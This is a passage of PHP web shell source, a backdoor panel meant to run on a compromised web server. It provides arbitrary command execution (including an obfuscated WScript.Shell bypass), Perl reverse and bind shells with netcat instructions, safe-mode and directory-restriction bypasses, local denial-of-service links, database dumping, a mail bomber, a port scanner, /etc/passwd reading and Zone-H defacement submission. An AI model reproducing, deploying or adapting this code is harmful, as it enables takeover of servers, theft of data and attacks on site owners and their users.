".$_SERVER['HTTP_HOST']."</li><br><li>Admin Server : ".$_SERVER['SERVER_ADMIN'].'</li></ul>',"");exit;
		break;
	case 'symlink':
		//Symlink
		switch($_POST['method']){
			case 'php':
				if (@function_exists('symlink')){
					symlink($_POST['fileaddress'],$_POST['filedes']);
					alert("Symlink Worked !");
				}else{
					alert("Symlink Not Worked !");
				}
				break;
			case 'os':
				if (system('ls -s '.$_POST['fileaddress']." ".$_POST['filedes'])){
					alert("Symlink Worked !");
				}else{
					alert("Symlink Not Worked !");
				}
				break;
		}
		echo $THEME->Main(input_hidden("do","symlink").'<b><<<< Symlink >>>></b><hr><p align=center><input name=fileaddress size=50> TO <input value="'.getcwd().$slash."symlink.txt".'" name=filedes size=50> Use <select name=method><option value="php">Php</option><option value="os">Operation System</option></SELECT><br><input type=submit value=Symlink>','post');exit;
		break;
	case 'cmd':
		//Command Execute
		if($_POST['method']){
			switch ($_POST['method']){
				case 'system':
					$res=$CMD->System($_POST['command']);
					break;
				case 'exec':
					$res=$CMD->Exec($_POST['command']);
					break;
				case 'passthru':
					$res=$CMD->passthru($_POST['command']);
					break;
				case 'shell':
					$res=$CMD->Shell_Exec($_POST['command']);
					break;
				case 'proc':
					$res=$CMD->Proc_Open($_POST['command']);
					break;
				case 'popen':
					$res=$CMD->Popen($_POST['command']);
					break;
				case 'all':
					$res=$CMD->Check_All($_POST['command']);
					break;
			}
		}
		echo $THEME->Main('<p align="center"><b><<<< Command Execute >>>></b><hr><p align=center><textarea rows="19" name="S1" cols="87">'.$res.'</textarea></p><p align="center"><input type=hidden name=do size=50 value=cmd> <input name=command size="50"><select name=method><option value="system">System</option><option value="exec">Exec</option><option value="passthru">Passthru</option><option value="shell">Shell_Exec</option><option value="proc">Proc_open</option><option value="popen">popen</option></select><input type="submit" value="eXecute">',"post");exit;
		break;
	case 'd0slocal':
		//D0s Local Server
		if ($_GET['method']){
			$DD0S=new DD0S();
			switch($_GET['method']){
				case '1':
					$DD0S->D0s5_3_Local();
					break;
				case '2':
					$DD0S->D0s4_Local();
					break;
			}
		}
		echo $THEME->Main('<b><<<< D0S Local Server >>>></b><hr><p align=center>If You Click This Link This Server Crashed.<br>This Worked In Php 5.3.x : <a href="?do=d0slocal&method=1" target="_blank"><font size=4>Dos This Server I Am Sure </font></a><br>This Worked In Php 4.x.x And 5.2.9 : <a href="?do=d0slocal&method=2" target="_blank"><font size=4>Dos This Server I Am Sure </a>',"");exit;
		break;
	case 'convert':
		//Convert String
		if ($_POST['text'] && $_POST['type']){
			$BASE64=new Base64();
			$HASH=new Hash();
			switch($_POST['type']){
				case 'b64e':
					$encodeString=$BASE64->Encode($_POST['text']);
					break;
				case 'b64d':
					$encodeString=$BASE64->Decode($_POST['text']);
					break;
				case 'md5';
					$encodeString=$HASH->Md5($_POST['text']);
					break;
				case 'sha1':
					$encodeString=$HASH->Sha1($_POST['text']);
					break;
				case 'crc32':
					$encodeString=$HASH->Crc32($_POST['text']);
					break;
			}
		}
		echo $THEME->Main(input_hidden("do","convert").'<b><<<< Convert String >>>></b><hr><p align=center><input name=text size=58><select name=type><option value="md5">MD5</option><option value="crc32">CRC32</option><option value="sha1">SHA1</option><option value="b64e">Base64 Encode</option><option value="b64d">Base64 Decode</option><br><textarea cols=60 rows=18>'.$encodeString.'</textarea><br><input type=submit value="Convert">',"post");exit;
		break;
	case 'bypasscmd':
		//Bypass Command Execute
		if($_POST['type']=='wsh'){
			$wsh = new COM('W'.'Scr'.'ip'.'t.she'.'ll');
            $exec = $wsh->exec ("cm"."d.e"."xe /c ".$_POST['command']."");
            $stdout = $exec->StdOut();
            $res = $stdout->ReadAll();
		}elseif($_POST['type']=='slash'){
			$res=passthru('\\'.$_POST['command']);
		}
		echo $THEME->Main(input_hidden("do","bypasscmd").'<b><<<< Bypass Windows Command Execute >>>></b><hr><p align=center><textarea cols=87 rows=19>'.$res.'</textarea><br><input name=command value="'.$sampleCommand.'" size=50> <select name=type><option value="wsh">Windows Shell Script</option><option value="slash">Back Slash</option></select><input type=submit value="  Execute  "></p>','post');exit;
		break;
	case 'dump':
		//Dump DataBase
		if ($_POST['username'] && $_POST['dbname'] && $_POST['method']){
			$date = date("Y-m-d");
			$dbserver = $_POST['server'];
			$dbuser = $_POST['username'];
			$dbpass = $_POST['password'];
			$dbname = $_POST['dbname'];
			$method = $_POST['method'];
			if ($method=='sql'){
				$file="Dump-$dbname-$date.sql";
				$fp=fopen($file,"w");
			}else{
				$file="Dump-$dbname-$date.sql.gz";
				$fp = gzopen($file,"w");
			}
			function write($data) {
				global $fp;
				if ($_POST['method']=='sql'){
					fwrite($fp,$data);
				}else{
					gzwrite($fp, $data);
				}
			}
			mysql_connect ($dbserver, $dbuser, $dbpass);
			mysql_select_db($dbname);
			$tables = mysql_query ("SHOW TABLES");
			while ($i = mysql_fetch_array($tables)) {
				$i = $i['Tables_in_'.$dbname];
				$create = @mysql_fetch_array(mysql_query ("SHOW CREATE TABLE ".$i));
				write($create['Create Table'].";\n\n");
				$sql = mysql_query ("SELECT * FROM ".$i);
				if (@mysql_num_rows($sql)) {
					while ($row = mysql_fetch_row($sql)) {
						foreach ($row as $j => $k) {
							$row[$j] = "'".mysql_escape_string($k)."'";
						}
						write("INSERT INTO $i VALUES(".implode(",", $row).");\n");
					}
				}
			}
			if ($method=='sql'){
				fclose ($fp);
			}else{
				gzclose($fp);
			}
			header("Content-Disposition: attachment; filename=" . $file);   
			header("Content-Type: application/download");
			header("Content-Length: " . filesize($file));
			flush();
			$fp = fopen($file, "r");
			while (!feof($fp)){
				echo fread($fp, 65536);
				flush();
			} 
			fclose($fp); 
		}
		echo $THEME->Main(input_hidden("do","dump").'<b><<<< Dump Database >>>></b><hr><p align=center><table border=1 width=400 style="border-collapse: collapse"  bordercolor=#C6C6C6 cellpadding=2><tr><td width=400 colspan=2 bgcolor=#F2F2F2><p align=center><b><font face=Arial size=2 color=#433934>Backup Database</font></b></td></tr><tr><td width=150 bgcolor=#EAEAEA><font face=Arial size=2>DB Type:</font></td><td width=250 bgcolor=#EAEAEA><select name=method><option value="gzip">Gzip</option><option value="sql">Sql</option> </select></td></tr><tr><td width=150 bgcolor=#EAEAEA><font face=Arial size=2>Server:</font></td><td width=250 bgcolor=#EAEAEA><input type=text name=server size=35></td></tr><tr><td width=150 bgcolor=#EAEAEA><font face=Arial size=2>Username:</font></td><td width=250 bgcolor=#EAEAEA><input type=text name=username size=35></td></tr><tr><td width=150 bgcolor=#EAEAEA><font face=Arial size=2>Password:</font></td><td width=250 bgcolor=#EAEAEA><input type=text name=password></td></tr><tr><td width=150 bgcolor=#EAEAEA><font face=Arial size=2>Data Base Name:</font></td><td width=250 bgcolor=#EAEAEA><input type=text name=dbname></td></tr><tr><td width=400 colspan=2 bgcolor=#EAEAEA><center><input type=submit value="  Dump!  " ></td></tr></table></center></table>',"post");exit;
		break;
	case 'mail':
		//Email Boomber
		if ($_POST['email'] && $_POST['subject'] ){
			for($i=0;$i<intval($_POST['time']);$i++){
				@mail($_POST['email'], $_POST['subject'], $_POST['text']);
			}
		}
		echo $THEME->Main(input_hidden("do","mail").'<b><<<< Mail Bomber >>>></b><hr><p align=center>Email : <input name=email size=50><br><br>Title : <input name=subject size=50><br><br><textarea cols=70 rows=18 name=text>Text</textarea><br><br>Number For Send : <input name=time size=5 value=100><input type=submit value=Send!>','post');exit;
		break;
	case 'db':
		//Data Base
		echo $head;sqlclienT();echo $end;exit;
		break;
	case 'bc':
		//Back Connect
		if ($_POST['port'] && $_POST['type']){
			$BACKCONNECT=new BackConnect();
			switch($_POST['type']){
				case 'bconnect':
					$BACKCONNECT->Back_Connect_Perl($_POST['ipaddress'],$_POST['port']);
					break;
				case 'bind_1':
					$BACKCONNECT->Bind_Port_Perl($_POST['port']);
					break;
				case 'bind_2':
					$BACKCONNECT->Bind_Port_Perl2($_POST['port']);
					break;
			}
		}
		echo $THEME->Main("<p align='center'><b><<<< Bypass Windows Command Execute >>>></b><hr></form>".$formPost.input_hidden("type","bconnect").input_hidden("do","bc")."<p align='center'>Ip Address : <input name=ipaddress value=".$_SERVER['REMOTE_ADDR'] ."> Port : <input name=port value=5555><br><input type=submit value=Connect></form>".$formPost.input_hidden("type","bind_1").input_hidden("do","bc")."<p align='center'>Usage : Run Netcat In Your Machin And Execute This Command( nc -l -n -v -p 5555 )<br><hr><p align='center'><<<<<< Windows Bind Port >>>>>><br>Port : <input name=port value=5555><br><input type=submit value=Connect></form>".$formPost.input_hidden("type","bind_2").input_hidden("do","bc")."<p align='center'>Usage : Run Netcat In Your Machin And Execute This Command( nc -l -p 5555  )<br><hr><p align='center'><<<<<< Linux Bind Port >>>>>><br>Port : <input name=port value=5555><br><input type=submit value=Connect>","");exit;
		break;
	case 'bypassdir':
		$BYPASS=new Byp4ss();
		//Bypass
		if($_POST['fileaddress'] && $_POST['method']){
			switch($_POST['method']){
				case 'curl5':
					$res=$BYPASS->Curl5($_POST['fileaddress']);
					break;
				case 'curl4':
					$res=$BYPASS->Curl4($_POST['fileaddress']);
					break;
				case 'zlib':
					$res=$BYPASS->Zlib($_POST['fileaddress']);
					break;
				case 'symlink':
					$res=$BYPASS->Symlink($_POST['fileaddress']);
					break;
				case 'ini':
					$res=$BYPASS->Ini($_POST['fileaddress']);
					break;
			}
		}elseif($_POST['diraddress'] && $_POST['method']){
			$res=$BYPASS->Glob($_POST['diraddress']);
		}
		echo $THEME->Main(input_hidden("do","bypassdir").'<b><<<< Bypass >>>></b><hr><p align=center>'.$nowAddress.'Read File : <input name=fileaddress value="'.getcwd().$slash.'" size=50> <select name=method><option value="curl5">Curl 4.x.x To 5.2.9</option><option value="curl4">Curl 4.x.x To 5.1.4</option><option value="zlib">Zlib 4.x.x To 5.1.2</option><option value="ini">Ini_Restore</option><option value="symlink">Symlink 4.x.x To 5.2.11</option></select> <input type=submit value=Read></form>'.$formPost.input_hidden("do","bypassdir").'<p align=center>Show Dir : <input name=diraddress value="'.getcwd().$slash.'" size=50> <select name=method><option value="glob">Glob Vun 5.x.x To 5.2.4 </option></select> '.$nowAddress.'<input type=submit value=Show><hr><p align=center><textarea cols=87 rows=19>'.htmlentities($res).'</textarea>',"post");exit;
	case 'edit':
		//Edit File
		if($_POST['text'] && $_POST['filename']){
			check_error(Write_File($_POST['address'].$slash.$_POST['filename'],html_entity_decode($_POST['text'])),"File Saved");
			break;
		}
		if($_GET['filename'] || $_GET['fulladdress']){
			if($_GET['fulladdress']){
				$address=$_GET['fulladdress'];
				$fileName=basename($_GET['fulladdress']);
			}else{
				$address=$_GET['address'].$_GET['filename'];
				$fileName=$_GET['filename'];
			}
			if(is_readable($address)){
				$opedit=fopen($address,"r");
				while(!feof($opedit))
					$data.=fread($opedit,9999);
				fclose($opedit); 
				echo $THEME->Main(input_hidden("do","edit").'<b><<<< Edit File >>>></b><hr><p align=center>File Name : '.$address.'<br><textarea rows="19" name="text" cols="87">'.htmlentities("$data").'</textarea><br><input value="'.$fileName.'" name=filename><br><input type=submit value="  Save  ">',"post");exit;
			}else{
			alert("Permission Denied !");}
		}
		break;
	case 'newfile':
		//Create New File
		if($_POST['text'] && $_POST['filename']){
			check_error(Write_File($_POST['filename'],$_POST['text']),"File Saved");
			break;
		}
		echo $THEME->Main(input_hidden("do","newfile").input_hidden("address",getcwd()).'<b><<<< Create File >>>></b><hr><p align=center><textarea rows="19" name="text" cols="87"></textarea><br><input value="'.$_REQUEST['filename'].'" name=filename size=50><br><input type=submit value="  Create  ">',"post");exit;
		break;
	case 'newdir':
		//Create New Dir
		if($_POST['dirname']){
			check_error(@mkdir($_POST['dirname'],"0777"),"Directory Created");
		}
		break;
	case 'upload':
		//Upload File
		if (isset($_FILES["filee"]) and ! $_FILES["filee"]["error"]){
			if(move_uploaded_file($_FILES["filee"]["tmp_name"], $_FILES["filee"]["name"])){
				alert("File Upload Successful");
			}else{
				alert("Permission Denied !");
			}
		}
		break;
	case 'chmod':
		//Change Permission
		if ($_POST['name'] && $_POST['chmod']){
			check_error(@chmod($_POST['name'],"0".$_POST['chmod']),"Chmoded");
			break;
		}
		echo $THEME->Main(input_hidden("do","chmod").input_hidden("name",$_GET['filename']).'<b><<<< Chmod >>>></b><hr><p align=center>Set Premession : <input name=chmod value=777><input type=submit value=chmod>',"post");exit;
		break;
	case 'password':
		//Password
		if($_SESSION['Login']=="ok"){
			//Change Password
			if ($_POST['oldPassword'] && $_POST['newPassword']){
				$source=Read_File($baseAddress.$_SERVER['PHP_SELF']);
				$source=str_replace(md5($_POST['oldPassword']),md5($_POST['newPassword']),$source);
				check_error(Write_File($baseAddress.$_SERVER['PHP_SELF'],$source),'Password Changed');
				break;
			}
			echo $THEME->Main(input_hidden("do","password").'<b><<<< Change Password >>>></b><hr><p align=center>Old Password : <input name=oldPassword> New Password : <input name=newPassword><input type=submit value="  Set  ">','post');exit;
		}
		if(empty($loginPassword)){
			//Set A Password
			if($_POST['newPassword']){
				$passSource='<?php $loginPassword="'.md5($_POST['newPassword']).'";//Password
';
				$source=Read_File($baseAddress.$_SERVER['PHP_SELF']);
				$source=substr($source,5);
				check_error(Write_File($baseAddress.$_SERVER['PHP_SELF'],$passSource.$source),'Password Add');
				break;
			}
			echo $THEME->Main(input_hidden("do","password").'<b><<<< Edit >>>></b><hr><p align=center>Password : <input name=newPassword><input type=submit value="  Set  ">','post');exit;
		}
	case 'phpinf0':
		//Show PhpInfo
		echo "<a href='?do=filemanager'>Back</a><br>";
		echo phpinfo();
		exit;
		break;
	case 'checkbox':
		//Do Form CheckBox
		$fileCounterC=0;
		switch ($_POST['command']){
			case 'del':
				//Del All Checked In CheckBox
				foreach(Get_Checkbox($_POST) as $fileName){
					$fileCounterC++;
					if(is_dir($fileName)){
						$FILEMANAGER->Delete_Dir($fileName);
					}elseif(is_file($fileName)){
						$FILEMANAGER->Remove_File($fileName);
					}
				}
				check_error($fileCounterC,"$fileCounterC Deleted");
				break;
			case 'copy':
				//Copy All Checked In CheckBox
				if($_POST['list'] && $_POST['destfile']){
					$arrayFiles=explode(",_,",$_POST['list']);
					foreach($arrayFiles as $fileName){
						$fileCounterC++;
						if(is_dir($fileName)){
							$FILEMANAGER->Copy_Dir($fileName,$_POST['destfile']);
						}elseif(is_file($fileName)){
							$FILEMANAGER->Copy_File($fileName,$_POST['destfile'],"");
						}
					}
					check_error($fileCounterC,"$fileCounterC Copyed");
					break;
				}
				foreach(Get_Checkbox($_POST) as $tmpFile){
					$fileList.=$tmpFile."<br>";
				}
				echo $THEME->Main(input_hidden("do","checkbox").input_hidden("command","copy").input_hidden("list",implode(",_,",Get_Checkbox($_POST))).'<b><<<< Copy Files >>>></b><hr><p align=center>'.$fileList.'To<br><input name=destfile size=50 value="'.getcwd().'"><input type=submit value="  Paste  ">','post');exit;
				break;
			case 'move':
				//Copy All Checked In CheckBox
				if($_POST['list'] && $_POST['destfile']){
					$arrayFiles=explode(",_,",$_POST['list']);
					foreach($arrayFiles as $fileName){
						$fileCounterC++;
						if(is_dir($fileName)){
							$FILEMANAGER->Move_Dir($fileName,$_POST['destfile']);
						}elseif(is_file($fileName)){
							$FILEMANAGER->Move_File($fileName,$_POST['destfile']);
						}
					}
					check_error($fileCounterC,"$fileCounterC Moved");
					break;
				}
				foreach(Get_Checkbox($_POST) as $tmpFile){
					$fileList.=$tmpFile."<br>";
				}
				echo $THEME->Main(input_hidden("do","checkbox").input_hidden("command","move").input_hidden("list",implode(",_,",Get_Checkbox($_POST))).'<b><<<< Copy Files >>>></b><hr><p align=center>'.$fileList.'To<br><input name=destfile size=50 value="'.getcwd().'"><input type=submit value="  Paste  ">','post');exit;
				break;
			case 'chmod':
				//Change Permission All Checked In CheckBox
				if($_POST['list'] && $_POST['perm']){
					$arrayFiles=explode(",_,",$_POST['list']);
					foreach($arrayFiles as $fileName){
						$fileCounterC++;
						chmod($fileName,'0'.$_POST['perm']);
					}
					check_error($fileCounterC,"$fileCounterC Chmoded");
					break;
				}
				foreach(Get_Checkbox($_POST) as $tmpFile){
					$fileList.=$tmpFile."<br>";
				}
				echo $THEME->Main(input_hidden("do","checkbox").input_hidden("command","chmod").input_hidden("list",implode(",_,",Get_Checkbox($_POST))).'<b><<<< Chmod Files >>>></b><hr><p align=center>'.$fileList.'To<br><input name=perm size=5 value="777"><input type=submit value="  Chmod  ">','post');exit;
				break;

		}
		break;
	case 'multiupload':
		//Upload Multipe File
		if($_POST['multiupload']){
			foreach ($_FILES["files"]["error"] as $key => $error) {
				if ($error == UPLOAD_ERR_OK) {
					echo"$error_codes[$error]";
					@move_uploaded_file($_FILES["files"]["tmp_name"][$key],$_FILES["files"]["name"][$key]);
					$uploadCounter++;
				}
			}
			if ($uploadCounter>=1){
				alert($uploadCounter." Files Uploaded Successful!");
			}else{
				alert('Permission Denied !');
			}
			break;
		}
		echo $THEME->Main('</form><b><<<< Upload Multipe File >>>></b><hr><p align=center><form action="'.$myUrl.'" method=post enctype=multipart/form-data><p align=center><input size=40 type=file name=files[] ><input size=40 type=file name=files[] ><input size=40 type=file name=files[] ><input size=40 type=file name=files[] ><input size=40 type=file name=files[] ><input size=40 type=file name=files[] ><input size=40 type=file name=files[] ><input size=40 type=file name=files[] ><input size=40 type=file name=files[] ><input size=40 type=file name=files[] ><input size=40 type=file name=files[] ><input size=40 type=file name=files[] ><input size=40 type=file name=files[] ><input size=40 type=file name=files[] ><input size=40 type=file name=files[] ><input size=40 type=file name=files[] ><input size=40 type=file name=files[] ><input size=40 type=file name=files[] ><input size=40 type=file name=files[] ><input size=40 type=file name=files[] ><input size=40 type=file name=files[] ><input size=40 type=file name=files[] ><input size=40 type=file name=files[] ><input size=40 type=file name=files[] ><input size=40 type=file name=files[] ><input size=40 type=file name=files[] ><input size=40 type=file name=files[] ><input size=40 type=file name=files[] >'.input_hidden("do","multiupload").input_hidden("multiupload","yes").'<input type=hidden name=address value="'.getcwd().'"><br>
		<input type=submit value=Upload><br> <font size=1>Maximum Size : '.ini_get('upload_max_filesize').'</font></form>',"");exit;
		break;
	case 'port':
		//Port Scanner
		if($_POST['portnum1'] && $_POST['portnum2'] && $_POST['ipaddress']){
			$arrayOpenPort=PortScanner($_POST['portnum1'],$_POST['portnum2'],$_POST['ipaddress']);
				foreach($arrayOpenPort as $tmpPort){
					echo $THEME->Main($tmpPort.'<br>','');exit;
				}
			break;
		}
		echo $THEME->Main(input_hidden("do","port").'<b><<<< Port Scanner >>>></b><hr><p align=center>ip : <input name=ipaddress value=127.0.0.1 size=30> Port : <input name=portnum1 size=7 value=1> To <input name=portnum2 size=7 value=1000> <input type=submit value="  Scan  ">','post');exit;
		break;
	case 'cookie':
		//Set Cookie Or Session
		if($_POST['sessionname'] && $_POST['sessionvalue']){
			$_SESSION[$_POST['sessionname']]=$_POST['sessionvalue'];
			alert("Session Set");
			break;
		}elseif($_POST['cookiename'] && $_POST['cookievalue']){
			check_error(@setcookie($_POST['cookiename'], $_POST['cookievalue']),"Cookie Set");
			break;
		}
		echo $THEME->Main(input_hidden("do","cookie").'<b><<<< Set Cookie >>>></b><hr><p align=center>Name : <input name=cookiename size=40><br> Value : <input name=cookievalue size=40><br><input type=submit value="Set Cookie"></form><hr>'.$formPost.'<p align=center>'.input_hidden("do","cookie").$nowAddress.'<b><<<< Set Session >>>></b><hr><p align=center><br>Name : <input name=sessionname size=40><br> Value : <input name=sessionvalue size=40><br><input type=submit value="Set Session">','post');exit;
		break;
	case 'processes':
		//Show Processes List
		echo $THEME->Main("<b><<<< Processes List >>>></b><hr><p align=center><textarea cols=87 rows=19>".GetProcesses()."</textarea>","");exit;
		break;
	case 'move':
		//Move File
		if($_POST['sourcefile'] && $_POST['destfile']){
			check_error($FILEMANAGER->Move_File($_POST['sourcefile'],$_POST['destfile']),"File Moved");
		}elseif($_GET['sourcefile']){
			$arrayDirList=ListDir(getcwd(),"dir","move");
			echo $THEME->Main('<font face="Tahoma" style="font-size: 6pt"><table cellpadding="0" cellspacing="0" style="border-style: dotted; border-width: 1px" bordercolor="#CDCDCD" width="950" height="20" dir="ltr"><form method=post action="'.$_SERVER['PHP_SELF'].'" name="base">
			<tr><td valign="top" height="19" width="842"><font face="Tahoma" style="font-size: 9pt"><font color=#4a7af4>Now Directory : '.getcwd()."<br>".printdrive().'<br><font color=#000000><a href="?do=move&sourcefile='.$_GET['sourcefile'].'&address='.$FILEMANAGER->Back(getcwd()).'">Back</a></span></td>
			</tr></table>'.$arrayDirList['dir'].input_hidden("do",'move').input_hidden("sourcefile",$_GET['sourcefile']).input_hidden("destfile",$_REQUEST['address']).'<p align=center><input type=submit value=Move>','post');exit;
		}
		break;
	case 'copy':
		//Copy File
		if ($_POST['sourcefile'] && $_POST['destfile']){
			check_error($FILEMANAGER->Copy_File($_POST['address'].$slash.$_POST['sourcefile'],$_POST['destfile'],""),"Copy File");
		}elseif($_GET['sourcefile']){
			$arrayDirList=ListDir(getcwd(),"dir","copy");
			echo $THEME->Main('<font face="Tahoma" style="font-size: 6pt"><table cellpadding="0" cellspacing="0" style="border-style: dotted; border-width: 1px" bordercolor="#CDCDCD" width="950" height="20" dir="ltr"><form method=post action="'.$_SERVER['PHP_SELF'].'" name="base">
			<tr><td valign="top" height="19" width="842"><font face="Tahoma" style="font-size: 9pt"><font color=#4a7af4>Now Directory : '.getcwd()."<br>".printdrive().'<br><font color=#000000><a href="?do=move&sourcefile='.$_GET['sourcefile'].'&address='.$FILEMANAGER->Back(getcwd()).'">Back</a></span></td>
			</tr></table>'.$arrayDirList['dir'].input_hidden("do",'copy').input_hidden("sourcefile",$_GET['sourcefile']).input_hidden("destfile",$_REQUEST['address']).'<p align=center><input type=submit value=Paste>','post');exit;
		}
		break;
	case 'copydir':
		//Copy Dir
		if($_POST['sourcedir'] && $_POST['destdir']){
			check_error($FILEMANAGER->Copy_Dir($_POST['sourcedir'],$_POST['destdir']),"Dir Copy");
		}elseif($_GET['sourcedir']){
			$arrayDirList=ListDir(getcwd(),"dir","copydir");
			echo $THEME->Main('<font face="Tahoma" style="font-size: 6pt"><table cellpadding="0" cellspacing="0" style="border-style: dotted; border-width: 1px" bordercolor="#CDCDCD" width="950" height="20" dir="ltr"><form method=post action="'.$_SERVER['PHP_SELF'].'" name="base">
			<tr><td valign="top" height="19" width="842"><font face="Tahoma" style="font-size: 9pt"><font color=#4a7af4>Now Directory : '.getcwd()."<br>".printdrive().'<br><font color=#000000><a href="?do=copydir&sourcedir='.$_GET['sourcedir'].'&address='.$FILEMANAGER->Back(getcwd()).'">Back</a></span></td>
			</tr></table>'.$arrayDirList['dir'].input_hidden("do",'copydir').input_hidden("sourcedir",$_GET['sourcedir']).input_hidden("destdir",$_REQUEST['address']).'<p align=center><input type=submit value=Paste>','post');exit;
		}
		break;
	case 'movedir':
		//Move Dir
		if($_POST['sourcedir'] && $_POST['destdir']){
			check_error($FILEMANAGER->Move_Dir($_POST['sourcedir'],$_POST['destdir']),"Dir Copy");
		}elseif($_GET['sourcedir']){
			$arrayDirList=ListDir(getcwd(),"dir","movedir");
			echo $THEME->Main('<font face="Tahoma" style="font-size: 6pt"><table cellpadding="0" cellspacing="0" style="border-style: dotted; border-width: 1px" bordercolor="#CDCDCD" width="950" height="20" dir="ltr"><form method=post action="'.$_SERVER['PHP_SELF'].'" name="base">
			<tr><td valign="top" height="19" width="842"><font face="Tahoma" style="font-size: 9pt"><font color=#4a7af4>Now Directory : '.getcwd()."<br>".printdrive().'<br><font color=#000000><a href="?do=copydir&sourcedir='.$_GET['sourcedir'].'&address='.$FILEMANAGER->Back(getcwd()).'">Back</a></span></td>
			</tr></table>'.$arrayDirList['dir'].input_hidden("do",'movedir').input_hidden("sourcedir",$_GET['sourcedir']).input_hidden("destdir",$_REQUEST['address']).'<p align=center><input type=submit value=Paste>','post');exit;
		}
		break;
	case 'zone':
		//Submit in Zone_h.org
		if($_POST['url'] && $_POST['name']){
			foreach (explode(",",$_POST['url']) as $tmpUrl){
				Zone_H($tmpUrl,$_POST['name']);
			}
			break;
		}
		echo $THEME->Main('<b><<<< Submit In Zone-H.org >>>></b><hr><p align=center>'.input_hidden("do","zone").'<b>Single</b><br><br>Url : <input name=url size=50 value='.$_SERVER['HTTP_HOST'].'><br> Name : <input name=name size=30 value="Your Name"><br><input type=submit value=Submit></form><hr>'.$formPost.'<p align=center><b>Multi Submiter</b><br><br>Name : <input name=name size=30 value="Your Name"><br>Split With "," Example : www.yahoo.com,www.google.com,www.example.com,www.site.com<br><textarea cols=87 rows=10 name=url></textarea>'.input_hidden("do","zone").'<br><input type=submit value=Submit>','post');exit;
		break;
	case 'users':
		//Show Users List
		if(Is_Win){
			$res=$CMD->Check_All("net user");
		}else{
			if(!$res=Read_File("/etc/passwd")){
				for($bye=0;$bye<200;$bye++){
					$res.= posix_getpwuid($bye);
				}
				if(!$res){
					$res="Can Not Read etc/passwd";
				}
			}
		}
		echo $THEME->Main('<b><<<< Users List >>>></b><hr><p align=center><textarea cols=87 rows=19>'.$res.'</textarea>','');exit;
		break;
	
}
$arrayFiles=ListDir(getcwd(),"","");
$backLink='<a href="?address='.$FILEMANAGER->Back(getcwd()).'"><img border=0 src="'.$_SERVER['PHP_SELF'].'?do=image&img=back" /></a>';

echo $head.'
<script type="text/javascript">
function check_all() {
     var myForm = document.forms["base"];
	 var checked=1;
		if (myForm.elements[myForm.length-1].checked!=""){
			var checked=0;
		}
     for( var i=0; i < myForm.length; i++ ) {
          if(checked) {
               myForm.elements[i].checked = "checked";
          } 
          else {
               myForm.elements[i].checked = "";
          }
     }
}
</script>
<font face="Tahoma" style="font-size: 6pt"><table cellpadding="0" cellspacing="0" style="border-style: dotted; border-width: 1px" bordercolor="#CDCDCD" width="950" height="20" dir="ltr"><form method=get action="'.$_SERVER['PHP_SELF'].'" name="base">
<tr><td valign="top" height="19" width="842"><p align="left"><font face="Tahoma" style="font-size: 9pt"><font color=#4a7af4>Now Directory : '.Split_Address(getcwd())."<br>".printdrive().'<br>'.$backLink.'</span></td>
</tr></table>'.$arrayFiles['dir'].$arrayFiles['file'].''.$nowAddress.'<table cellpadding="0" cellspacing="0" bgcolor='.'#eaeaea'.' class=list><td valign=top height=10 width=842>Directory : '.$DirCount.' -- File : '.$FileCount.'</td><td valign="top" height="19" width="80"></td><td valign="top" height="19" width="65"></td><td valign="top" height="19" width="30"></td><td valign="top" height="19" width="30"></td><td valign="top" height="19" width="23"></td><td valign="top" height="19" width="30"></td><td valign="top" height="19" width="180">'.input_hidden("do","checkbox").'<select name=command><option value="copy">Copy</option><option value="move">Move</option><option value="del">Delete</option><option value="chmod">Chmod</option></select> <input type=submit value=Execute></td><td valign="top" height="19" width="33"></form><input onclick="check_all();" type=checkbox name="'.$fileName.'"></td></tr></table></table>
<table border="0" width="950" style="border-collapse: collapse" id="table4" cellpadding="5">
<tr>
<td width="200" align="right"  class=control><br>'.$formPost.'Command Execute : </td><td width="750" class=control>'.$nowAddress.'<input name=command value="'.$sampleCommand.'" size=50>'.input_hidden("do","cmd").' <select name=method><option value="system">System</option> <option value="exec">Exec</option><option value="passthru">Passthru</option><option value="shell">Shell_Exec</option><option value="proc">Proc_open</option><option value="popen">Popen</option>
</select> <input type=submit value=Execute></form></td></tr>
<tr>
<td width="200" align="right"  class=control>
<br>'.$formGet.'Change Dir : </td>
<td width="750" class=control><input name=address value="'.getcwd().$slash.'" size=50>
<input type=submit value=Change></form></td></tr>
<tr>
<td width="200" align="right" class=control>
<br>'.$formGet.'Edit File : </td>
<td width="750" class=control>'.input_hidden("do","edit").'<input name=fulladdress value="'.getcwd().$slash.'" size=50>'.$nowAddress.' <input type=submit value="  Edit  "></form></td></tr>
<tr>
<td width="200" align="right" class=control>
<br>'.$formPost.'Create Dir : </td>
<td width="750" class=control>'.input_hidden("do","newdir").'<input name=dirname value="'.getcwd().$slash.'" size=50>'.$nowAddress.' <input type=submit value="  Create  "></form></td></tr>
<tr>
<td width="200" align="right" class=control>
<br>'.$formGet.'Create File : </td>
<td width="750" class=control>'.input_hidden("do","newfile").'<input name=filename value="'.getcwd().$slash.'" size=50> '.$nowAddress.'<input type=submit value="  Create  "></form></td></tr>
<tr>
<td width="200" align="right" class=control>
<br><form action="'.$myUrl.'" method=post enctype=multipart/form-data>Upload : </td>
<td width="750" class=control>'.$nowAddress.'
<input size=40 type=file name=filee >'.input_hidden("do","upload").' <input type=hidden name=address value="'.getcwd().'">
<input type=submit value=Upload> </font><font face=arial size=1></b>Maximum Size : '.ini_get('upload_max_filesize').'</font></form></td></tr>
'.$end;
?>
